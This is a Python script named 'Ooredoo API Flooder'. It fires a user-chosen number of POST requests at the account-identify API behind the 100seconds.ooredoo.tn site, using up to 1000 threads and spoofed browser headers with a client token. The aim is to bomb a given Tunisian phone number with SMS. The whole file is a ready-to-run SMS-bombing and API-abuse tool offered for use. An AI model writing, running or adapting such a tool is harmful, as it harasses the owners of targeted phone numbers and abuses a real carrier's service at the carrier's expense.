import requests
import threading
import itertools
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
from threading import Lock

init(autoreset=True)

request_count = 0
lock = Lock()
stop_event = threading.Event()

HEADERS = {
    "Host": "apis.100seconds.com",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Client-Token": "OTN-PROD-29112021",
    "Sec-Ch-Ua": "\"Not:A-Brand\";v=\"24\", \"Chromium\";v=\"134\"",
    "Auth-Token": "null",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua-Mobile": "?0",
    "Device-Id": "c695646c8cc3e9fc457690fc4988bb18",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "User-Agent": "Mozilla/5.0",
    "Origin": "https://100seconds.ooredoo.tn",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://100seconds.ooredoo.tn/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=4, i"
}

URL = "https://apis.100seconds.com/api/account/identify"

def send_request(phone_number, max_requests):
    global request_count
    payload_template = f"phone_number=%2B216{phone_number}&country_code=tn&lang_code=FR"
    while True:
        with lock:
            if request_count >= max_requests or stop_event.is_set():
                stop_event.set()
                break
            request_count += 1
        try:
            requests.post(URL, data=payload_template, headers=HEADERS, timeout=5)
        except Exception:
            pass  # ignore errors/timeouts

def show_counter(max_requests):
    spinner = itertools.cycle(['|', '/', '-', '\\'])
    while not stop_event.is_set():
        with lock:
            count = request_count
        spin = next(spinner)
        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count} / {max_requests}", end='', flush=True)
        if count >= max_requests:
            break
        time.sleep(0.1)
    print(f"\n{Fore.YELLOW}Done! Sent {request_count} requests.")

def main_menu():
    while True:
        print(Fore.YELLOW + "Ooredoo API Flooder")

        phone_number = input(Fore.CYAN + "Enter phone number (8 digits, e.g. 26262626): ").strip()
        if not phone_number.isdigit() or len(phone_number) != 8:
            print(Fore.RED + "Invalid phone number. Must be 8 digits.")
            continue

        try:
            thread_count = int(input(Fore.CYAN + "How many threads? (10 to 1000): ").strip())
            if not 10 <= thread_count <= 1000:
                raise ValueError
        except ValueError:
            print(Fore.RED + "Invalid thread count. Must be between 10 and 1000.")
            continue

        try:
            max_requests = int(input(Fore.CYAN + "How many SMS/requests to send?: ").strip())
            if max_requests <= 0:
                raise ValueError
        except ValueError:
            print(Fore.RED + "Invalid number of requests.")
            continue

        print(Fore.GREEN + f"\n🚀 Launching Ooredoo flooder with {thread_count} threads targeting {phone_number} to send {max_requests} requests...\n")

        global request_count
        request_count = 0
        stop_event.clear()

        threading.Thread(target=show_counter, args=(max_requests,), daemon=True).start()

        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            for _ in range(thread_count):
                executor.submit(send_request, phone_number, max_requests)

        choice = input(Fore.YELLOW + "\nFinished sending requests. Press 1 to go back to the main menu, or any other key to exit: ").strip()
        if choice != "1":
            print(Fore.CYAN + "Exiting. Goodbye!")
            break
        else:
            print(Fore.GREEN + "Returning to main menu...\n")

if __name__ == "__main__":
    main_menu()
